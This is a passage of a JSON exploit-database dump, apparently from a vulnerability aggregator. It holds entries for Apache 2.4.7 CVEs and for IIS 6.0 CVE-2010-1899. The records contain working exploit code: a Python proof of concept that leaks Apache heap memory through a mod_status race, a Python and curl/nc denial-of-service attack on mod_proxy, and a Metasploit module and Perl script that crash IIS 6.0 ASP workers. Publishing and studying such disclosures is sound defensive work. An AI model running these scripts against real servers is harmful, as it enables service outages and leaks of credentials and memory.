ap_copy_scoreboard_worker(worker_score *dest,\r\n+ int child_num,\r\n+ int thread_num)\r\n+{\r\n+ worker_score *ws = ap_get_scoreboard_worker_from_indexes(child_num, thread_num);\r\n+\r\n+ memcpy(dest, ws, sizeof *ws);\r\n+\r\n+ /* For extra safety, NUL-terminate the strings returned, though it\r\n+ * should be true those last bytes are always zero anyway. */\r\n+ dest->client[sizeof(dest->client) - 1] = '\\0';\r\n+ dest->request[sizeof(dest->request) - 1] = '\\0';\r\n+ dest->vhost[sizeof(dest->vhost) - 1] = '\\0';\r\n+}\r\n+\r\nAP_DECLARE(process_score *) ap_get_scoreboard_process(int x)\r\n{\r\nif ((x < 0) || (x >= server_limit)) {\r\n\r\n\r\n-----------------------------------------------------------------------\r\nApache 2.4.7 mod_status Scoreboard Handling Race Condition\r\n-----------------------------------------------------------------------\r\n\r\n--[ 0. Sparse summary\r\nRace condition between updating httpd's \"scoreboard\" and mod_status,\r\nleading to several critical scenarios like heap buffer overflow with\r\nuser\r\nsupplied payload and leaking heap which can leak critical memory\r\ncontaining\r\nhtaccess credentials, ssl certificates private keys and so on.\r\n--[ 1. Prerequisites\r\n \r\nApache httpd compiled with MPM event or MPM worker.\r\nThe tested version was 2.4.7 compiled with:\r\n \r\n    ./configure --enable-mods-shared=reallyall --with-included-apr\r\n \r\nThe tested mod_status configuration in httpd.conf was:\r\n        SetHandler server-status\r\n    ExtendedStatus On\r\n--[ 2. Race Condition\r\n \r\nFunction ap_escape_logitem in server/util.c looks as follows:\r\n \r\n    1908AP_DECLARE(char *) ap_escape_logitem(apr_pool_t *p, const char\r\n*str)\r\n    1909{\r\n    1910    char *ret;\r\n    1911    unsigned char *d;\r\n    1912    const unsigned char *s;\r\n    1913    apr_size_t length, escapes = 0;\r\n    1914\r\n    1915    if (!str) {\r\n    1916        return NULL;\r\n    1917    }\r\n    1918\r\n    1919    /* Compute how many characters need to be escaped */\r\n    1920    s = (const unsigned char *)str;\r\n    1921    for (; *s; ++s) {\r\n    1922        if (TEST_CHAR(*s, T_ESCAPE_LOGITEM)) {\r\n    1923            escapes++;\r\n    1924        }\r\n    1925    }\r\n    1926\r\n    1927    /* Compute the length of the input string, including NULL\r\n*/\r\n    1928    length = s - (const unsigned char *)str + 1;\r\n    1929\r\n    1930    /* Fast path: nothing to escape */\r\n    1931    if (escapes == 0) {\r\n    1932        return apr_pmemdup(p, str, length);\r\n    1933    }\r\n \r\nIn the for-loop between 1921 and 1925 lines function is computing the\r\nlength of\r\nsupplied str (almost like strlen, but additionally it counts special\r\ncharacters\r\nwhich need to be escaped). As comment in 1927 value says, function\r\ncomputes count\r\nof bytes to copy. If there's nothing to escape function uses\r\napr_pmemdup to duplicate\r\nthe str. In our single-threaded mind everything looks good, but tricky\r\npart starts\r\nwhen we introduce multi-threading. Apache in MPM mode runs workers as\r\nthreads, let's\r\nconsider the following scenario:\r\n \r\n    1) ap_escape_logitem(pool, \"\") is called\r\n    2) for-loop in 1921 line immediately escapes, because *s is  in\r\nfirst loop run\r\n    3) malicious thread change memory under *s to another value\r\n(something which is not )\r\n    4) apr_pmemdup copies that change value to new string and returns\r\nit\r\n \r\nOutput from the ap_escape_logitem is considered to be a string, if\r\nscenario above would occur,\r\nthen returned string would not be zeroed at the end, which may be\r\nharmful. The mod_status\r\ncode looks as follows:\r\n \r\n    833                    ap_rprintf(r, \"%s%s\"\r\n    834                                  \"%snn\",\r\n    835                               ap_escape_html(r->pool,\r\n    836                                            \r\nws_record->client),\r\n    837                               ap_escape_html(r->pool,\r\n    838                                            \r\nws_record->vhost),\r\n    839                               ap_escape_html(r->pool,\r\n    840                                            \r\nap_escape_logitem(r->pool,\r\n    841                                                    \r\nws_record->request)));\r\n \r\nThe relevant call to ap_escape_html() is at line 839 after the\r\nevaluation of ap_escape_logitem().\r\nThe first argument passed to the ap_escape_logitem() is in fact an apr\r\npool associated with\r\nthe HTTP request and defined in the request_rec structure.\r\n \r\nThis code is a part of a larger for-loop where code is iterating over\r\nworker_score structs which is\r\ndefined as follows:\r\n \r\n    90struct worker_score {\r\n    91#if APR_HAS_THREADS\r\n    92    apr_os_thread_t tid;\r\n    93#endif\r\n    94    int thread_num;\r\n    95    /* With some MPMs (e.g., worker), a worker_score can\r\nrepresent\r\n    96     * a thread in a terminating process which is no longer\r\n    97     * represented by the corresponding process_score.  These\r\nMPMs\r\n    98     * should set pid and generation fields in the worker_score.\r\n    99     */\r\n    100    pid_t pid;\r\n    101    ap_generation_t generation;\r\n    102    unsigned char status;\r\n    103    unsigned short conn_count;\r\n    104    apr_off_t     conn_bytes;\r\n    105    unsigned long access_count;\r\n    106    apr_off_t     bytes_served;\r\n    107    unsigned long my_access_count;\r\n    108    apr_off_t     my_bytes_served;\r\n    109    apr_time_t start_time;\r\n    110    apr_time_t stop_time;\r\n    111    apr_time_t last_used;\r\n    112#ifdef HAVE_TIMES\r\n    113    struct tms times;\r\n    114#endif\r\n    115    char client[40];            /* Keep 'em small... but large\r\nenough to hold an IPv6 address */\r\n    116    char request[64];           /* We just want an idea... */\r\n    117    char vhost[32];             /* What virtual host is being\r\naccessed? */\r\n    118};\r\n \r\nThe 'request' field in a worker_score structure is particularly\r\ninteresting - this field can be changed inside\r\nthe copy_request function, which is called by the\r\nupdate_child_status_internal. This change may occur when the\r\nmod_status is iterating over the workers at the same time the\r\nap_escape_logitem is called within a different\r\nthread, leading to a race condition. We can trigger this exact\r\nscenario in order to return a string without a\r\ntrailing . This can be achived by running two clients, one triggering\r\nthe mod_status handler and second\r\nsending random requests to the web server. Let's consider the\r\nfollowing example:\r\n \r\n    1) the mod_status iterates over workers invoking\r\nupdate_child_status_internal()\r\n    2) at some point for one worker mod_status calls\r\nap_escape_logitem(pool, ws_record->request)\r\n    3) let's asume that ws_record->request at the beginning is \"\"\r\nliterally  at the first byte.\r\n    4) inside the ap_escape_logitem function the length of the\r\nws_record->request is computed, which is 1\r\n       (an empty string consisting of )\r\n    5) another thread modifies ws_record->request (in fact it's called\r\nws->request in update_child_status_internal\r\n       function but it's exactly the same location in memory) and puts\r\nthere i.e. \"GET / HTTP/1.0\"\r\n    6) the ap_pmemdup(pool, str, 1) in ap_escape_logitem copies the\r\nfirst one byte from \"GET / HTTP/1.0\" - \"G\" in\r\n       that case and returns it. The ap_pmemdup looks as follows:\r\n \r\n       112APR_DECLARE(void *) apr_pmemdup(apr_pool_t *a, const void\r\n*m, apr_size_t n)\r\n       113{\r\n       114    void *res;\r\n       115\r\n       116    if (m == NULL)\r\n       117      return NULL;\r\n       118    res = apr_palloc(a, n);\r\n       119    memcpy(res, m, n);\r\n       120    return res;\r\n \r\n       It allocates memory using apr_palloc function which returns\r\n\"ditry\" memory (note that apr_pcalloc overwrite\r\n       allocated memory with NULs).\r\n \r\n       So it's non-deterministic what's after the copied \"G\" byte.\r\nThere might be  or might be not. For now let's\r\n       assume that the memory allocated by apr_palloc was dirty\r\n(containing random bytes).\r\n    7) ap_escape_logitem returns \"G.....\" .junk. \"\"\r\n \r\nThe value from the example above is then pushed to the ap_escape_html2\r\nfunction which is also declared in util.c:\r\n \r\n    1860AP_DECLARE(char *) ap_escape_html2(apr_pool_t *p, const char\r\n*s, int toasc)\r\n    1861{\r\n    1862    int i, j;\r\n    1863    char *x;\r\n    1864\r\n    1865    /* first, count the number of extra characters */\r\n    1866    for (i = 0, j = 0; s[i] != ''; i++)\r\n    1867        if (s[i] == '')\r\n    1868            j += 3;\r\n    1869        else if (s[i] == '&')\r\n    1870            j += 4;\r\n    1871        else if (s[i] == '\"')\r\n    1872            j += 5;\r\n    1873        else if (toasc && !apr_isascii(s[i]))\r\n    1874            j += 5;\r\n    1875\r\n    1876    if (j == 0)\r\n    1877        return apr_pstrmemdup(p, s, i);\r\n    1878\r\n    1879    x = apr_palloc(p, i + j + 1);\r\n    1880    for (i = 0, j = 0; s[i] != ''; i++, j++)\r\n    1881        if (s[i] == '') {\r\n    1886            memcpy(&x[j], \">\", 4);\r\n    1887            j += 3;\r\n    1888        }\r\n    1889        else if (s[i] == '&') {\r\n    1890            memcpy(&x[j], \"&\", 5);\r\n    1891            j += 4;\r\n    1892        }\r\n    1893        else if (s[i] == '\"') {\r\n    1894            memcpy(&x[j], \"\"\", 6);\r\n    1895            j += 5;\r\n    1896        }\r\n    1897        else if (toasc && !apr_isascii(s[i])) {\r\n    1898            char *esc = apr_psprintf(p, \"&#%3.3d;\", (unsigned\r\nchar)s[i]);\r\n    1899            memcpy(&x[j], esc, 6);\r\n    1900            j += 5;\r\n    1901        }\r\n    1902        else\r\n    1903            x[j] = s[i];\r\n    1904\r\n    1905    x[j] = '';\r\n    1906    return x;\r\n    1907}\r\n \r\nIf the string from the example above would be passed to this function\r\nwe should get the following code-flow:\r\n \r\n    1) in the for-loop started in line 1866 we count the length of\r\nescaped string\r\n    2) because 's' string contains junk (due to only one byte being\r\nallocated by the apr_palloc function),\r\n       it may contain '>' character. Let's assume that this is our\r\ncase\r\n    3) after for-loop in 1866 line 'j' is greater than 0 (at least one\r\ns[i] equals '>' as assumed above\r\n    4) in the 1879 line memory for escaped 'd' string is allocated\r\n    5) for-loop started in line 1880 copies string 's' to the escaped\r\n'd' string BUT apr_palloc has allocated\r\n       only one byte for 's'. Thus, for each i > 0 the loop reads\r\nrandom memory and copies that value\r\n       to 'd' string. At this point it's possible to trigger an\r\ninformation leak vulnerability (see section 5).\r\n \r\nHowever the 's' string may overlap with 'd' i.e.:\r\n \r\n    's' is allocated under 0 with contents s = \"AAAAAAAA>\"\r\n    'd' is allocated under 8 then s[8] = d[0].\r\n \r\nIf that would be the case, then for-loop would run forever (s[i] never\r\nwould be  since it was overwritten in the loop\r\nby non-zero). Forever... until it hits an unmapped memory or read only\r\narea.\r\n \r\nPart of the scoreboard.c code which may overwrite the\r\nws_record->request was discovered using a tsan:\r\n \r\n    #1 ap_escape_logitem ??:0 (exe+0x0000000411f2)\r\n    #2 status_handler\r\n/home/akat-1/src/httpd-2.4.7/modules/generators/mod_status.c:839\r\n(mod_status.so+0x0000000044b0)\r\n    #3 ap_run_handler ??:0 (exe+0x000000084d98)\r\n    #4 ap_invoke_handler ??:0 (exe+0x00000008606e)\r\n    #5 ap_process_async_request ??:0 (exe+0x0000000b7ed9)\r\n    #6 ap_process_http_async_connection http_core.c:0\r\n(exe+0x0000000b143e)\r\n    #7 ap_process_http_connection http_core.c:0 (exe+0x0000000b177f)\r\n    #8 ap_run_process_connection ??:0 (exe+0x00000009d156)\r\n    #9 process_socket event.c:0 (exe+0x0000000cc65e)\r\n    #10 worker_thread event.c:0 (exe+0x0000000d0945)\r\n    #11 dummy_worker thread.c:0 (libapr-1.so.0+0x00000004bb57)\r\n    #12  :0 (libtsan.so.0+0x00000001b279)\r\n \r\n  Previous write of size 1 at 0x7feff2b862b8 by thread T2:\r\n    #0 update_child_status_internal scoreboard.c:0\r\n(exe+0x00000004d4c6)\r\n    #1 ap_update_child_status_from_conn ??:0 (exe+0x00000004d693)\r\n    #2 ap_process_http_async_connection http_core.c:0\r\n(exe+0x0000000b139a)\r\n    #3 ap_process_http_connection http_core.c:0 (exe+0x0000000b177f)\r\n    #4 ap_run_process_connection ??:0 (exe+0x00000009d156)\r\n    #5 process_socket event.c:0 (exe+0x0000000cc65e)\r\n    #6 worker_thread event.c:0 (exe+0x0000000d0945)\r\n    #7 dummy_worker thread.c:0 (libapr-1.so.0+0x00000004bb57)\r\n    #8  :0 (libtsan.so.0+0x00000001b279)\r\n--[ 3. Consequences\r\n \r\nRace condition described in section 2, may lead to:\r\n \r\n - information leak in case when the string returned by\r\nap_escape_logitem is not  at the end,\r\n   junk after copied bytes may be valuable\r\n - overwriting heap with a user supplied value which may imply code\r\nexecution\r\n--[ 4. Exploitation\r\n \r\n In order to exploit the heap overflow bug it's necessary to get\r\ncontrol over:\r\n \r\n 1) triggering the race-condition bug\r\n 2) allocating 's' and 'd' strings in the ap_escape_html2 to overlap\r\n 3) part of 's' which doesn't overlap with 'd' (this string is copied\r\nover and over again)\r\n 4) overwriting the heap in order to get total control over the cpu or\r\nat least modify the\r\n    apache's handler code flow for our benefits\r\n--[ 5. Information Disclosure Proof of Concept\r\n \r\n    -- cut\r\n    #! /usr/bin/env python\r\n \r\n    import httplib\r\n    import sys\r\n    import threading\r\n    import subprocess\r\n    import random\r\n \r\n    def send_request(method, url):\r\n        try:\r\n            c = httplib.HTTPConnection('127.0.0.1', 80)\r\n            c.request(method,url);\r\n            if \"foo\" in url:\r\n                print c.getresponse().read()\r\n            c.close()\r\n        except Exception, e:\r\n            print e\r\n            pass\r\n \r\n    def mod_status_thread():\r\n        while True:\r\n            send_request(\"GET\", \"/foo?notables\")\r\n \r\n    def requests():\r\n        evil = ''.join('A' for i in range(random.randint(0, 1024)))\r\n        while True:\r\n            send_request(evil, evil)\r\n \r\n    threading.Thread(target=mod_status_thread).start()\r\n    threading.Thread(target=requests).start()\r\n \r\n    -- cut\r\n \r\nBelow are the information leak samples gathered by running the poc\r\nagainst the\r\ntesting Apache instance. Leaks include i.e. HTTP headers, htaccess\r\ncontent,\r\nhttpd.conf content etc. On a live systems with a higher traffic\r\nsamples should\r\nbe way more interesting.\r\n \r\n $ ./poc.py | grep \"\" |grep -v AAAA | grep -v \"{}\"| grep -v notables\r\n 127.0.0.1 {A} []\r\n 127.0.0.1 {A.01 cu0 cs0\r\n 127.0.0.1 {A27.0.0.1} []\r\n 127.0.0.1 {A|0|10 [Dead] u.01 s.01 cu0 cs0\r\n 127.0.0.1 {A\r\n                \u00db []\r\n 127.0.0.1 {A HTTP/1.1} []\r\n 127.0.0.1 {Ab><br />\r\n 127.0.0.1 {AAA}</i> <b>[127.0.1.1:19666]</b><br\r\n/>\r\n 127.0.0.1 {A0.1.1:19666]</b><br />\r\n 127.0.0.1 {A\u00a7} []\r\n 127.0.0.1 {A cs0\r\n 127.0.0.1 {Adentity\r\n 127.0.0.1 {A HTTP/1.1} []\r\n 127.0.0.1 {Ape: text/html; charset=ISO-8859-1\r\n 127.0.0.1 {Ahome/IjonTichy/httpd-2.4.7-vanilla/htdocs/} []\r\n 127.0.0.1 {A\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff} []\r\n 127.0.0.1 {Aanilla/htdocs/foo} []\r\n 127.0.0.1 {A0n/httpd-2.4.7-vanilla/htdocs/foo/} []\r\n 127.0.0.1 {A.........................................     } []\r\n 127.0.0.1 {A-2014 16:23:30 CEST} []\r\n 127.0.0.1 {Acontent of htaccess\r\n 127.0.0.1 {Aver: Apache/2.4.7 (Unix)\r\n 127.0.0.1 {Aroxy:balancer://mycluster} []\r\nWe hope you enjoyed it.\r\n \r\nRegards,\r\nMarek Kroemeke, AKAT-1 and 22733db72ab3ed94b5f8a1ffcde850251fe6f466\n\n#  0day.today [2018-02-06]  #",
            "cvss": {
                "score": 6.8,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/zdt/1337DAY-ID-22451"
        }
    ],
    "CVE-2014-0117": [
        {
            "bulletinFamily": "exploit",
            "description": "No description provided by source.",
            "modified": "2014-07-24T00:00:00",
            "published": "2014-07-24T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-87152",
            "id": "SSV:87152",
            "type": "seebug",
            "title": "Apache 2.4.x mod_proxy \u62d2\u7edd\u670d\u52a1\u653b\u51fb PoC",
            "sourceData": "\n                                                # Exploit Title: Apache 2.4.x mod_proxy Denial Of Service(CVE-2014-0117)\r\n# Date: 2014-07-20\r\n# Exploit Author: aisyhi\r\n# Version: 0.1\r\n# Apache httpd 2.4.6 to 2.4.9\r\n# Tested on: Apache/2.4.7\r\n# CVE : CVE-2014-0117\r\n\r\nimport httplib\r\nimport logging\r\nimport time\r\nimport socket\r\nimport sys\r\nimport os\r\n\r\ndebug = False\r\nsocket.setdefaulttimeout(3)\r\nhttplib.HTTPConnection.debuglevel = 1 if debug else 0\r\npacket = 0\r\n\r\nprint &quot;======================================================================&quot;\r\nprint u&quot;Apache 2.4.x mod_proxy Denial Of Service(CVE-2014-0117)&quot;\r\nprint &quot;======================================================================&quot;\r\n\r\nif len(sys.argv) &lt; 2:\r\n    print &quot;Usage: python CVE-2014-0117.py [target ip] [target port]\\n&quot;\r\n    print &quot;Example: python CVE-2014-0117 127.0.0.1\\n&quot;\r\n    sys.exit(1)\r\nelse:\r\n    host = sys.argv[1].lower()\r\n    try:\r\n        port = int(sys.argv[2])\r\n    except:\r\n        port = 80\r\n\r\nwhile packet &lt;= 10:\r\n    try:\r\n        con = httplib.HTTPConnection(host, port)\r\n        con.putrequest('GET', '/')\r\n        con.putheader('User-Agent', &quot;curl/7.30.0&quot;)\r\n        con.putheader('Accept', &quot;*/*&quot;)\r\n        con.putheader('Connection', &quot;;&quot;)\r\n        con.endheaders()\r\n    except:\r\n        print &quot;Connection error!&quot;\r\n        sys.exit(1)\r\n\r\n    try:\r\n        resp = con.getresponse()\r\n        print(resp.status, resp.reason)\r\n\r\n    except socket.timeout:\r\n        print &quot;[*] Socket timeout?&quot;\r\n\r\n    except:\r\n        print &quot;[*] Knock knock, is anybody there ? (&quot; + str(packet) + &quot;/10)&quot;\r\n\r\n    packet = packet + 1\r\n\r\n    con.close()\r\n\r\nprint &quot;[+] Done!&quot;\n                              ",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:87152"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2014-07-22T00:00:00",
            "published": "2014-07-22T00:00:00",
            "href": "https://packetstormsecurity.com/files/127563/Apache-2.4.x-mod_proxy-Denial-Of-Service.html",
            "id": "PACKETSTORM:127563",
            "type": "packetstorm",
            "title": "Apache 2.4.x mod_proxy Denial Of Service",
            "sourceData": "` ::: ::::::::: ::: :::::::: ::: ::::::::::::: ::: :::::::::::::::::::::::::::::::::: :::::::::   \n:+: :+: :+: :+: :+: :+: :+: :+::+: :+::+: :+: :+: :+: :+: :+: :+::+: :+:   \n+:+ +:+ +:+ +:++:+ +:+ +:+ +:+ +:++:+ +:+ +:+ +:+ +:+ +:+ +:++:+ +:+   \n+#++:++#++:+#++:++#++#++:++#++:+#+ +#++:++#+++#++:++# +#++:++#++ +#+ +#+ +#++:++#+ +#+ +:+   \n+#+ +#++#+ +#+ +#++#+ +#+ +#++#+ +#+ +#+ +#+ +#+ +#+ +#+ +#+   \n#+# #+##+# #+# #+##+# #+##+# #+##+# #+# #+# #+# #+# #+# #+# #+#   \n### ###### ### ### ######## ### ############# ### ### ### ### ### #########   \n  \n:::::::: ::: ::::::::::::: :::::::: ::::::: ::: ::: ::::::: ::: ::::::::::::::   \n:+: :+::+: :+::+: :+: :+::+: :+::+:+: :+: :+: :+::+:+: :+:+::+: :+:   \n+:+ +:+ +:++:+ +:+ +:+ :+:+ +:+ +:+ +:+ +:+ :+:+ +:+ +:+ +:+   \n+#+ +#+ +:++#++:++# #++:++ +#+ +#+ + +:+ +#+ +#+ +:+ #++:+++ #+ + +:+ +#+ +#+ +#+   \n+#+ +#+ +#+ +#+ +#+ +#+# +#+ +#++#+#+#+#+#+ +#+# +#+ +#+ +#+ +#+   \n#+# #+# #+#+#+# #+# #+# #+# #+# #+# #+# #+# #+# #+# #+# #+#   \n######## ### ########## ########## ####### ####### ### ####### ############## ###   \n  \n+:+:+:+:+:+:++:+:+:+:+:+:++:+:+:+:+:+:++:+:+:+:+:+:++:+:+:+:+:+:++:+:+:+:+:+:++:+:+:+:+:+:++:+:+:+:+:+:++:+:+:+:+:+  \n+#+#+#+#+#+#++#+#+#+#+#+#++#+#+#+#+#+#++#+#+#+#+#+#++#+#+#+#+#+#++#+#+#+#+#+#++#+#+#+#+#+#++#+#+#+#+#+#++#+#+#+#+#+  \n  \n  \nHi there,  \n  \nSoftware: apache httpd 2.4.7 , possibly others from 2.3 and 2.4 branches.  \n  \nIf apache is configured with mod_proxy module (for example in front of  \na tomcat, or proxypassing requests to other backend servers), it is possible  \nto use all available memory on the server and potenatially cause an OOM  \ncondition that requires a reboot. In our tests, a single requests was causing  \napache to spin and keep allocating memory (gigabytes in seconds). A simple bash  \nscript that does this X time can speed the process up.  \n  \nBug can be triggered in request or response.  \n  \nPoC (request):  \n-- cut --  \ncurl -H 'Connection: ;' http://127.0.0.1/  \n-- cut --  \n  \nPoC (response):  \nprintf \"HTTP/1.1 200 OK\\r\\nConnection: ;\\r\\n\\r\\n\" | nc -l -p 80  \n  \n  \nExample config to replicate it, in httpd.conf :  \n-- cut --  \n<Proxy balancer://mycluster>  \nBalancerMember http://127.0.0.1:8100  \n</Proxy>  \nProxyPass / balancer://mycluster  \n-- cut --  \n  \nthen listen on port 8100 :  \n-- cut --  \nnc -l -p 8100  \n-- cut --  \n  \nThen send a request with \"Connection: ;\" header and watch the memory usage.  \n-- cut --  \ncurl -H 'Connection: ;' http://127.0.0.1/  \n-- cut --  \n  \nSingle request will usually get killed with the following message:  \n-- cut --  \n[crit] Memory allocation failed, aborting process.  \n[core:notice] [pid 3205:tid 139786428621120] AH00051: child pid 4212 exit signal Aborted (6), possible coredump in  \n-- cut --  \n  \nhence it may be more visible on machines with huge ram by running more requests, ideally  \nconcurrently but this should do as well for demonstration purposes:  \n-- cut --  \nfor i in `seq 1 100` ; do curl -m 1 -H 'Connection: ;' http://127.0.0.1/ ; done   \n-- cut --  \n  \n  \nNow where the problem is : incorrect parsing in find_conn_headers , it only moves   \nthe pointer when it encounters a comma, and calls ap_get_token which returns an empty  \nstring as it skips over ';'.   \n  \n  \n// key == 'Connection'  \n// val == ';'  \n  \nstatic int find_conn_headers(void *data, const char *key, const char *val)  \n{  \nheader_connection *x = data;  \nconst char *name;  \n  \ndo {  \nwhile (*val == ',') { // jump over expected comma separator  \nval++;   \n}  \nname = ap_get_token(x->pool, &val, 0); // returns empty string in our case   \nif (!strcasecmp(name, \"close\")) { // not mached, branch not taken  \nx->closed = 1;  \n}  \nif (!x->first) { // branch taken   \nx->first = name; // \"\" as name is empty   \n}  \nelse { // branch not taken due to above   \nconst char **elt;  \nif (!x->array) {  \nx->array = apr_array_make(x->pool, 4, sizeof(char *));  \n}  \nelt = apr_array_push(x->array);  \n*elt = name;  \n}  \n} while (*val); // val is still ';'  \n  \nreturn 1;  \n}  \n  \n/* Retrieve a token, spacing over it and returning a pointer to  \n* the first non-white byte afterwards. Note that these tokens  \n* are delimited by semis and commas; and can also be delimited  \n* by whitespace at the caller's option.  \n*/  \n  \nAP_DECLARE(char *) ap_get_token(apr_pool_t *p, const char **accept_line,  \nint accept_white)  \n{  \nconst char *ptr = *accept_line;  \nconst char *tok_start;  \nchar *token;  \nint tok_len;  \n  \n/* Find first non-white byte */  \n  \nwhile (apr_isspace(*ptr))  \n++ptr;  \n  \ntok_start = ptr; // ';'  \n  \n/* find token end, skipping over quoted strings.  \n* (comments are already gone).  \n*/  \n  \nwhile (*ptr && (accept_white || !apr_isspace(*ptr))  \n&& *ptr != ';' && *ptr != ',') { // not satisfied as ';'  \nif (*ptr++ == '\"') // skips the if itself  \nwhile (*ptr)  \nif (*ptr++ == '\"')  \nbreak;  \n}  \n  \ntok_len = ptr - tok_start; // 0  \ntoken = apr_pstrndup(p, tok_start, tok_len); // token = \"\"  \n  \n/* Advance accept_line pointer to the next non-white byte */  \n  \nwhile (apr_isspace(*ptr)) // not a space  \n++ptr;  \n  \n*accept_line = ptr;  \nreturn token;  \n}  \n  \n  \nWe hope you enjoyed it.  \n  \nRegards,  \nMarek Kroemeke, AKAT-1 and 22733db72ab3ed94b5f8a1ffcde850251fe6f466  \n  \n  \n`\n",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:127563"
        }
    ],
    "CVE-2010-1899": [
        {
            "bulletinFamily": "exploit",
            "description": "The vulnerability allows remote unauthenticated attackers to force the IIS server to become unresponsive until the IIS service is restarted manually by the administrator. Required is that Active Server Pages are hosted by the IIS and that an ASP script reads out a Post Form value.\n",
            "modified": "2017-07-24T13:26:21",
            "published": "2010-11-24T20:10:01",
            "id": "MSF:AUXILIARY/DOS/WINDOWS/HTTP/MS10_065_II6_ASP_DOS",
            "href": "",
            "type": "metasploit",
            "title": "Microsoft IIS 6.0 ASP Stack Exhaustion Denial of Service",
            "sourceData": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft IIS 6.0 ASP Stack Exhaustion Denial of Service',\n      'Description'    => %q{\n          The vulnerability allows remote unauthenticated attackers to force the IIS server\n        to become unresponsive until the IIS service is restarted manually by the administrator.\n        Required is that Active Server Pages are hosted by the IIS and that an ASP script reads\n        out a Post Form value.\n      },\n      'Author'         =>\n        [\n          'Heyder Andrade <heyder[at]alligatorteam.org>',\n          'Leandro Oliveira <leadro[at]alligatorteam.org>'\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2010-1899' ],\n          [ 'OSVDB', '67978'],\n          [ 'MSB', 'MS10-065'],\n          [ 'EDB', '15167' ]\n        ],\n      'DisclosureDate' => 'Sep 14 2010'))\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('VHOST', [ false, 'The virtual host name to use in requests']),\n        OptString.new('URI', [ true, 'URI to request', '/page.asp' ])\n      ])\n  end\n\n\n  def run\n    uri = datastore['URI']\n    print_status(\"Attacking http://#{datastore['VHOST'] || rhost}:#{rport}#{uri}\")\n\n    begin\n      while(1)\n        begin\n          connect\n          payload = \"C=A&\" * 40000\n          length = payload.size\n          sploit = \"HEAD #{uri} HTTP/1.1\\r\\n\"\n          sploit << \"Host: #{datastore['VHOST'] || rhost}\\r\\n\"\n          sploit << \"Connection:Close\\r\\n\"\n          sploit << \"Content-Type: application/x-www-form-urlencoded\\r\\n\"\n          sploit << \"Content-Length:#{length} \\r\\n\\r\\n\"\n          sploit << payload\n          sock.put(sploit)\n          #print_status(\"DoS packet sent.\")\n          disconnect\n        rescue Errno::ECONNRESET\n          next\n        end\n      end\n    rescue Errno::EPIPE\n      print_good(\"IIS should now be unavailable\")\n    end\n  end\nend\n",
            "cvss": {
                "score": 4.3,
                "vector": "AV:N/AC:M/Au:N/C:N/I:N/A:P"
            },
            "vhref": "https://vulners.com/metasploit/MSF:AUXILIARY/DOS/WINDOWS/HTTP/MS10_065_II6_ASP_DOS"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Microsoft IIS 6.0 ASP Stack Overflow (Stack Exhaustion) Denial of Service (MS10-065). CVE-2010-1899. Dos exploit for windows platform",
            "modified": "2010-10-01T00:00:00",
            "published": "2010-10-01T00:00:00",
            "id": "EDB-ID:15167",
            "href": "https://www.exploit-db.com/exploits/15167/",
            "type": "exploitdb",
            "title": "Microsoft IIS 6.0 ASP Stack Overflow Stack Exhaustion Denial of Service MS10-065",
            "sourceData": "Affected Vendors\r\nMicrosoft\r\n\r\nAffected Products\r\nOnly Microsoft IIS 6.0 was tested successfully\r\nOn a Windows Server 2003 SP2 System\r\nThe System was NOT updated to the latest patches during testing.\r\nSince tests \u201cin the wild\u201d have shown the attack to be real this advisory was released.\r\n\r\nVulnerability Details\r\n\r\nThe vulnerability allows remote unauthenticated attackers to force the IIS server to become\r\nunresponsive until the IIS service is restarted manually by the administrator.\r\nRequired is that Active Server Pages are hosted by the IIS and that an ASP script reads out a\r\nPost Form value. When the following ASP script is hosted by IIS the attacker can run the\r\nattack:\r\n\r\n\t<%\r\n\t\tDim variable\r\n\t\tvariable = Request.Form(\u201cFOOBAR\u201d)\r\n\t%>\r\n\r\nThis small script reads out a POST request argument from the client side.\r\n\r\nThe exploit is simple: The attacker sends a POST request to the ASP site which reads out\r\nPOST arguments. The POST request includes > 40000 request parameters and is sent in the\r\nform of an application/x-www-form-urlencoded encoding type.\r\n\r\nThe result is that one IIS worker process crashes because of a stack overflow (here stack\r\nexhaustion). Tests have shown that five consecutive requests of this type will cause the\r\ndefault application pool to be disabled because of a series of failures of the IIS worker\r\nprocesses. The IIS shows a \u201cService Unavailable\u201d response to requesting clients until the\r\nWorld Wide Web Publishing Service is restarted manually by the administrator.\r\n\r\n\r\nPoC Exploit\r\n# IIS 6.0 ASP DoS PoC\r\n# usage: perl IISdos.pl <host> <asp page>\r\nuse IO::Socket;\r\n$|=1;\r\n$host = $ARGV[0];\r\n$script = $ARGV[1];\r\nwhile(1) {\r\n$sock = IO::Socket::INET->new(PeerAddr => $host,\r\n                   PeerPort => 'http(80)',\r\n                   Proto => 'tcp');\r\n$write = \"C=A&\" x 40000;\r\nprint $sock \"HEAD /$script HTTP/1.1\\r\\nHost: $host\\r\\n\"\r\n           .\"Connection:Close\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n\"\r\n           .\"Content-Length:\". length($write) .\"\\r\\n\\r\\n\" . $write;\r\nprint \".\";\r\nwhile(<$sock>) {\r\n           print;\r\n}\r\n}\r\n\r\n\r\nExploit-DB Notes:\r\nIn our tests, a specific setting has to be modified in metabase.xml in order to trigger the exhaustion.  Tested systems: Windows Server 2003 Standard SP2, Windows Server 2003 Standard SP1, Windows Server 2003 Standard SP0",
            "cvss": {
                "score": 4.3,
